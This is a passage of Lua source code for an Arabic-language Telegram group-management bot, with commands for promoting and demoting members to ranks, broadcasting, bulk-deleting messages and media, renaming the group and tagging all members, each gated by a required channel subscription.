send(msg.chat_id_, msg.id_,'\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'..'\n ⊀︰ تم نزله من '..RTPA..'\n')   
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match('^ارفع (.*) @(.*)') and Mod(msg) then 
local text1 = {string.match(text, "^(ارفع) (.*) @(.*)$")}
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:sismember(bot_id..'Coomds'..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local blakrt = database:get(bot_id.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(text1[3] or 'SourcE_RiNdA')..')'..'\n ⊀︰ تم ارفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_,text1[2])
elseif blakrt == 'ادمن' and Manager(msg) then 
send(msg.chat_id_, msg.id_,'\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(text1[3] or 'SourcE_RiNdA')..')'..'\n ⊀︰ تم ارفعه '..text1[2]..'')   
database:sadd(bot_id..'Mod:User'..msg.chat_id_,result.id_)  
database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_,text1[2])
elseif blakrt == 'مدير' and Constructor(msg) then
send(msg.chat_id_, msg.id_,'\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(text1[3] or 'SourcE_RiNdA')..')'..'\n ⊀︰ تم ارفعه '..text1[2]..'')   
database:sadd(bot_id..'Manager'..msg.chat_id_,result.id_)  
database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_,text1[2])
elseif blakrt == 'عضو' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(text1[3] or 'SourcE_RiNdA')..')'..'\n ⊀︰ تم ارفعه '..text1[2]..'')   
end
else
info = '* ⊀︰ المعرف غلط*'
send(msg.chat_id_, msg.id_,info)
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end 
end
if text and text:match('^نزل (.*) @(.*)') and Mod(msg) then 
local text1 = {string.match(text, "^(نزل) (.*) @(.*)$")}
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:sismember(bot_id..'Coomds'..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local blakrt = database:get(bot_id.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(text1[3] or 'SourcE_RiNdA')..')'..'\n ⊀︰ تم تنريله من '..text1[2]..'')   
database:srem(bot_id..'Special:User'..msg.chat_id_,result.id_)  
database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_)
elseif blakrt == 'ادمن' and Manager(msg) then 
send(msg.chat_id_, msg.id_,'\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(text1[3] or 'SourcE_RiNdA')..')'..'\n ⊀︰ تم تنريله من '..text1[2]..'')   
database:srem(bot_id..'Mod:User'..msg.chat_id_,result.id_)  
database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_)
elseif blakrt == 'مدير' and Constructor(msg) then
send(msg.chat_id_, msg.id_,'\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(text1[3] or 'SourcE_RiNdA')..')'..'\n ⊀︰ تم تنريله من '..text1[2]..'')   
database:srem(bot_id..'Manager'..msg.chat_id_,result.id_)  
database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_)
elseif blakrt == 'عضو' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(text1[3] or 'SourcE_RiNdA')..')'..'\n ⊀︰ تم تنريله من '..text1[2]..'')   
end
else
info = '* ⊀︰ المعرف غلط*'
send(msg.chat_id_, msg.id_,info)
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end  
end
if text == "مسح رسايلي" or text == "مسح رسائلي" or text == "حذف رسايلي" or text == "حذف رسائلي" then  
send(msg.chat_id_, msg.id_,'* ⊀︰ تم مسح 𝖬𝗌𝖦𝖲*')  
database:del(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) 
end
if text == "رسايلي" or text == "رسائلي" or text == "msg" then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
send(msg.chat_id_, msg.id_,'* ⊀︰ عدد 𝖬𝗌𝖦𝖲 > { '..database:get(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_)..'}*' ) 
end 
if text == 'تفعيل الاذاعه' and Devmode(msg) then  
if database:get(bot_id..'Bc:Bots') then
database:del(bot_id..'Bc:Bots') 
Text = '\n ⊀︰ تم تفعيل الاذاعه' 
else
Text = '\n ⊀︰ بالتاكيد تم تفعيل الاذاعه'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الاذاعه' and Devmode(msg) then  
if not database:get(bot_id..'Bc:Bots') then
database:set(bot_id..'Bc:Bots',true) 
Text = '\n ⊀︰ تم تعطيل الاذاعه' 
else
Text = '\n ⊀︰ بالتاكيد تم تعطيل الاذاعه'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل التواصل' and Devmode(msg) then  
if database:get(bot_id..'Tuasl:Bots') then
database:del(bot_id..'Tuasl:Bots') 
Text = '\n ⊀︰ تم تفعيل التواصل' 
else
Text = '\n ⊀︰ بالتاكيد تم تفعيل التواصل'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل التواصل' and Devmode(msg) then  
if not database:get(bot_id..'Tuasl:Bots') then
database:set(bot_id..'Tuasl:Bots',true) 
Text = '\n ⊀︰ تم تعطيل التواصل' 
else
Text = '\n ⊀︰ بالتاكيد تم تعطيل التواصل'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل البوت الخدمي' and Devmode(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Free:Bots') then
database:del(bot_id..'Free:Bots') 
Text = '\n ⊀︰ تم تفعيل البوت الخدمي' 
else
Text = '\n ⊀︰ بالتاكيد تم تفعيل البوت الخدمي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل البوت الخدمي' and Devmode(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if not database:get(bot_id..'Free:Bots') then
database:set(bot_id..'Free:Bots',true) 
Text = '\n ⊀︰ تم تعطيل البوت الخدمي' 
else
Text = '\n ⊀︰ بالتاكيد تم تعطيل البوت الخدمي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text and text:match('^تنظيف (%d+)$') and Manager(msg) then
if not database:get(bot_id..'MODE7:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then           
local num = tonumber(text:match('^تنظيف (%d+)$')) 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if num > 1000 then 
send(msg.chat_id_, msg.id_,'⊀︰ تستطيع التنظيف 1000 رساله كحد اقصى') 
return false  
end  
local msgm = msg.id_
for i=1,tonumber(num) do
DeleteMessage(msg.chat_id_, {[0] = msgm})
msgm = msgm - 1048576
end
send(msg.chat_id_,msg.id_,'⊀︰ تم حذف {'..num..'}')  
database:setex(bot_id..'MODE7:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end
end
if text == "تنظيف الميديا" and Manager(msg) then
msgm = {[0]=msg.id_}
local Message = msg.id_
for i=1,100 do
Message = Message - 1048576
msgm[i] = Message
end
tdcli_function({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = msgm},function(arg,data)
new = 0
msgm2 = {}
for i=0 ,data.total_count_ do
if data.messages_[i] and data.messages_[i].content_ and data.messages_[i].content_.ID ~= "MessageText" then
msgm2[new] = data.messages_[i].id_
new = new + 1
end
end
DeleteMessage(msg.chat_id_,msgm2)
end,nil)  
send(msg.chat_id_, msg.id_,"*⊀︰ تم تنظيف جميع الميديا*")
end
if (msg.content_.animation_) or (msg.content_.photo_) or (msg.content_.video_) or (msg.content_.document) or (msg.content_.sticker_) and msg.reply_to_message_id_ == 0 then
database:sadd(bot_id.."MODE7:allM"..msg.chat_id_, msg.id_)
end
if text == ("امسح") and cleaner(msg) then  
local list = database:smembers(bot_id.."MODE7:allM"..msg.chat_id_)
for k,v in pairs(list) do
local Message = v
if Message then
t = "*⊀︰ تم مسح "..k.." من الوسائط الموجوده*"
DeleteMessage(msg.chat_id_,{[0]=Message})
database:del(bot_id.."MODE7:allM"..msg.chat_id_)
end
end
if #list == 0 then
t = "*⊀︰ لا يوجد ميديا في المجموعه*"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("عدد الميديا") and cleaner(msg) then  
local num = database:smembers(bot_id.."MODE7:allM"..msg.chat_id_)
for k,v in pairs(num) do
local numl = v
if numl then
l = "*⊀︰ عدد الميديا الموجود هو *"..k
end
end
if #num == 0 then
l = "*⊀︰ لا يوجد ميديا في المجموعه*"
end
send(msg.chat_id_, msg.id_, l)
end
if text == "تنظيف التعديل" and Manager(msg) then
Msgs = {[0]=msg.id_}
local Message = msg.id_
for i=1,100 do
Message = Message - 1048576
Msgs[i] = Message
end
tdcli_function({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data)
new = 0
Msgs2 = {}
for i=0 ,data.total_count_ do
if data.messages_[i] and (not data.messages_[i].edit_date_ or data.messages_[i].edit_date_ ~= 0) then
Msgs2[new] = data.messages_[i].id_
new = new + 1
end
end
DeleteMessage(msg.chat_id_,Msgs2)
end,nil)  
send(msg.chat_id_, msg.id_,'*⊀︰ تم تنظيف جميع الرسائل المعدله*')
end
if text == "تغير اسم البوت" or text == "تغيير اسم البوت" then 
if Devmode(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_," ⊀︰ ارسل لي الاسم الان ")  
end
return false
end

if text == ""..(database:get(bot_id..'Name:Bot') or 'ريندا').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'ريندا')
local RiNdA_Msg = {
'عمغي 🥺💕.',
'ياروحي كول اني  '..Namebot..'',
'شتريد من '..Namebot..'',
'دوختو  '..Namebot..'',
' كافي لزكت 😡🤬',
'وبعدين وياك ؟ 🥺',
'فخليتني 🥵😓',
'هاا شتريد كافي ☹️.',
'مشايف بوت شني 😂.',
'كول حبيبي ؟ اني '..Namebot..'',
'عمري فداك '..Namebot..' كول حب'
}
send(msg.chat_id_, msg.id_,'['..RiNdA_Msg[math.random(#RiNdA_Msg)]..']') 
return false
end
if text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 and Sudo(msg) then 
if database:get(bot_id..'Bc:Bots') and not Devmode(msg) then 
send(msg.chat_id_, msg.id_,' ⊀︰ الاذاعه معطله من قبل المطور الاساسي')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:setex(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ⊀︰ ارسل الان اذاعتك \n ⊀︰ للخروج ارسل الغاء") 
return false
end 
if text=="اذاعه" and msg.reply_to_message_id_ == 0 and Sudo(msg) then 
if database:get(bot_id..'Bc:Bots') and not Devmode(msg) then 
send(msg.chat_id_, msg.id_,' ⊀︰ الاذاعه معطله من قبل المطور الاساسي')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:setex(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ⊀︰ ارسل الان اذاعتك \n ⊀︰ للخروج ارسل الغاء ") 
return false
end  
if text=="اذاعه بالتوجيه" and msg.reply_to_message_id_ == 0  and Sudo(msg) then 
if database:get(bot_id..'Bc:Bots') and not Devmode(msg) then 
send(msg.chat_id_, msg.id_,' ⊀︰ الاذاعه معطله من قبل المطور الاساسي')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:setex(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ⊀︰ ارسل لي التوجيه الان") 
return false
end 
if text=="اذاعه بالتوجيه خاص" and msg.reply_to_message_id_ == 0  and Sudo(msg) then 
if database:get(bot_id..'Bc:Bots') and not Devmode(msg) then 
send(msg.chat_id_, msg.id_,' ⊀︰ الاذاعه معطله من قبل المطور الاساسي')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:setex(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ⊀︰ ارسل لي التوجيه الان") 
return false
end 
if text and text:match('^ضع اسم (.*)') and Manager(msg) or text and text:match('^خلي اسم (.*)') and Manager(msg) then 
local Name = text:match('^ضع اسم (.*)') or text and text:match('^خلي اسم (.*)') 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
tdcli_function ({ ID = "ChangeChatTitle",chat_id_ = msg.chat_id_,title_ = Name },function(arg,data) 
if data.message_ == "Channel chat title can be changed by administrators only" then
send(msg.chat_id_,msg.id_,"*⊀︰ البوت ليس ادمن يرجى ترقيتي*")  
return false  
end 
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_," ⊀︰ ليست لدي صلاحية تغير اسم الكروب")  
else
sebd(msg.chat_id_,msg.id_,' ⊀︰ تم تغيير اسم الكروب الى {['..Name..']}')  
end
end,nil) 
end
if text == "تاك للكل" and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'- بـࢪو ماتڪدࢪ تستعمل البـوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n- اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 200
},function(ta,RiNdA)
local t = "\nツ قائمة الاعضاء \n●━━━━𝐑𝐀━━━━●\n"
x = 0
local list = RiNdA.members_
for k, v in pairs(list) do
x = x + 1
if database:get(bot_id..'user:Name'..v.user_id_) then
t = t..""..x.." → {[@"..database:get(bot_id..'user:Name'..v.user_id_).."]}\n"
else
t = t..""..x.." → {"..v.user_id_.."}\n"
end
end
send(msg.chat_id_,msg.id_,t)
end,nil)
end
if text and text:match("^نزل الكل @(.*)$") and Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if (result.id_) then
if tonumber(result.id_) == true then
send(msg.chat_id_, msg.id_,"⊀︰ لا تستطيع نزل المطور الاساسي")
return false 
end
if database:sismember(bot_id.."Sudo:User",result.id_) then
dev = "المطور ،" else dev = "" end
if database:sismember(bot_id.."CoSu",result.id_) then
cu = "المالك ،" else cu = "" end
if database:sismember(bot_id.."Basic:Constructor"..msg.chat_id_, result.id_) then
crr = "منشئ اساسي ،" else crr = "" end
if database:sismember(bot_id..'Constructor'..msg.chat_id_, result.id_) then
cr = "منشئ ،" else cr = "" end
if database:sismember(bot_id..'Manager'..msg.chat_id_, result.id_) then
own = "مدير ،" else own = "" end
if database:sismember(bot_id..'MODE7:MN:TF'..msg.chat_id_, result.id_) then
mn = 'منظف ،' else mn = '' end
if database:sismember(bot_id..'Mod:User'..msg.chat_id_, result.id_) then
mod = "ادمن ،" else mod = "" end
if database:sismember(bot_id..'Special:User'..msg.chat_id_, result.id_) then
vip = "مميز ،" else vip = ""
end
if Can_or_NotCan(result.id_,msg.chat_id_) ~= false then
send(msg.chat_id_, msg.id_,"\n⊀︰ تم نزل الشخص من الرتب التاليه \n⊀︰ { "..dev..""..crr..""..cr..""..own..""..mod..""..mn..""..vip.." } \n")
else
send(msg.chat_id_, msg.id_,"\n⊀︰ عذرا ﭑݪعضوٍَ لايملك رتبه \n")
end
if tonumber(msg.sender_user_id_) == true then
database:srem(bot_id.."Sudo:User", result.id_)
database:srem(bot_id.."CoSu", result.id_)
database:srem(bot_id.."Basic:Constructor"..msg.chat_id_,result.id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'MODE7:MN:TF'..msg.chat_id_, result.id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.id_)
elseif database:sismember(bot_id.."Sudo:User",msg.sender_user_id_) then
database:srem(bot_id..'MODE7:MN:TF'..msg.chat_id_, result.id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.id_)
database:srem(bot_id.."Basic:Constructor"..msg.chat_id_,result.id_)
elseif database:sismember(bot_id.."CoSu",msg.sender_user_id_) then
database:srem(bot_id..'MODE7:MN:TF'..msg.chat_id_, result.id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.id_)
database:srem(bot_id.."Basic:Constructor"..msg.chat_id_,result.id_)
elseif database:sismember(bot_id.."Basic:Constructor"..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'MODE7:MN:TF'..msg.chat_id_, result.id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.id_)
elseif database:sismember(bot_id..'Constructor'..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'MODE7:MN:TF'..msg.chat_id_, result.id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.id_)
elseif database:sismember(bot_id..'Manager'..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'MODE7:MN:TF'..msg.chat_id_, result.id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.id_)
end
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^نزل الكل @(.*)$")}, start_function, nil)
end

if text == ("نزل الكل") and msg.reply_to_message_id_ ~= 0 and Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if tonumber(SUDO) == tonumber(result.sender_user_id_) then
send(msg.chat_id_, msg.id_," ⊀︰ لا تستطيع نزل المطور الاساسي")
return false 
end
if database:sismember(bot_id..'Sudo:User',result.sender_user_id_) then
dev = 'المطور ،' else dev = '' end
if database:sismember(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_) then
cu = 'المالك ،' else cu = '' end
if database:sismember(bot_id..'Basic:Constructor'..msg.chat_id_, result.sender_user_id_) then
crr = 'منشئ اساسي ،' else crr = '' end
if database:sismember(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_) then
cr = 'منشئ ،' else cr = '' end
if database:sismember(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_) then
own = 'مدير ،' else own = '' end
if database:sismember(bot_id..'MODE7:MN:TF'..msg.chat_id_, result.sender_user_id_) then
mn = 'منظف ،' else mn = '' end
if database:sismember(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_) then
mod = 'ادمن ،' else mod = '' end
if database:sismember(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_) then
vip = 'مميز ،' else vip = ''
end
if Can_or_NotCan(result.sender_user_id_,msg.chat_id_) ~= false then
send(msg.chat_id_, msg.id_,"\n ⊀︰ تم نزل الشخص من الرتب التاليه \n ⊀︰ { "..dev..''..crr..''..cr..''..own..''..mod..''..mn..''..vip.." } \n")
else
send(msg.chat_id_, msg.id_,"\n ⊀︰ عذرا ﭑݪعضوٍَ لايملك رتبه \n")
end
if tonumber(SUDO) == tonumber(msg.sender_user_id_) then
database:srem(bot_id..'Sudo:User', result.sender_user_id_)
database:srem(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'MODE7:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'Dev:mode:2',msg.sender_user_id_) then
database:srem(bot_id..'MODE7:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'Sudo:User',msg.sender_user_id_) then
database:srem(bot_id..'MODE7:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'CoSu'..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'MODE7:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_,result.sender_user_id_)
elseif database:sismember(bot_id..'Basic:Constructor'..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'MODE7:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'Constructor'..msg.chat_id_, msg.sender_user_id_) then
